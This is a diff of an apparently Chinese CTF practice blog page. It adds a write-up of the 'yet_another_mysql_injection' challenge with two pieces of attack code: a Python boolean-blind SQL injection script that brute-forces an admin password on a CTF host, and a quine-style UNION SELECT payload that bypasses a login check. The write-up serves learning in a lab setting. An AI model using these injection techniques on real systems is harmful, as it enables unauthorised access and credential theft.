@@ -48,8 +48,11 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153837239.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121153945954.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/sql/image-20240121155702752.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240430205709510.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240430205600578.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240430212747415.png">
 <meta property="article:published_time" content="2024-01-07T14:43:30.000Z">
-<meta property="article:modified_time" content="2024-01-27T11:51:01.695Z">
+<meta property="article:modified_time" content="2024-04-30T14:03:14.557Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="CTF刷题记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -253,7 +256,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.7k words
+          3.6k words
         
       </span>
     
@@ -264,7 +267,7 @@
         
         
         
-          23 mins
+          31 mins
         
       </span>
     
@@ -416,6 +419,26 @@
 
 <p>0x02</p>
 <p>基本思路就是，使用bool盲注的方式获取字段里面的值</p>
+<h1 id="第五空间-2021-yet-another-mysql-injection"><a href="#第五空间-2021-yet-another-mysql-injection" class="headerlink" title="[第五空间 2021]yet_another_mysql_injection"></a>[第五空间 2021]yet_another_mysql_injection</h1><p><strong>0x00</strong></p>
+<p>利用知识点</p>
+<ol>
+<li><p>quine</p>
+<p>sql 注入的内容是查询的内容</p>
+</li>
+</ol>
+<p><strong>0x01</strong></p>
+<p>发现了源码</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240430205709510.png" srcset="/img/loading.gif" lazyload alt="image-20240430205709510"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240430205600578.png" srcset="/img/loading.gif" lazyload alt="image-20240430205600578"></p>
+<p><strong>0x02</strong></p>
+<p>可以使用盲注的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests,time<br>alp = <span class="hljs-string">&quot;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pass</span>():<br>    url = <span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28164/index.php&quot;</span><br>    flag = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> alp:<br>            data=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">f&quot;1&#x27;or/**/password/**/like/**/&#x27;<span class="hljs-subst">&#123;flag+i&#125;</span>%&#x27;#&quot;</span>&#125;<br>            resp = requests.post(url=url,data=data)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;something wrong&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>                flag+=i<br>                <span class="hljs-built_in">print</span>(flag)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;~&quot;</span> <span class="hljs-keyword">in</span> i:<br>                <span class="hljs-keyword">return</span><br>get_pass()<br></code></pre></td></tr></table></figure>
+
+<p><strong>0x03</strong></p>
+<p>或者使用Quine 注入的形式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;/**/union/**/select/**/replace(replace(&#x27;</span><span class="hljs-number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>replace(replace(&quot;.&quot;,<span class="hljs-type">char</span>(<span class="hljs-number">34</span>),<span class="hljs-type">char</span>(<span class="hljs-number">39</span>)),<span class="hljs-type">char</span>(<span class="hljs-number">46</span>),&quot;.&quot;)#<span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20240430212747415.png" srcset="/img/loading.gif" lazyload alt="image-20240430212747415"></p>
 
                 
               </div>
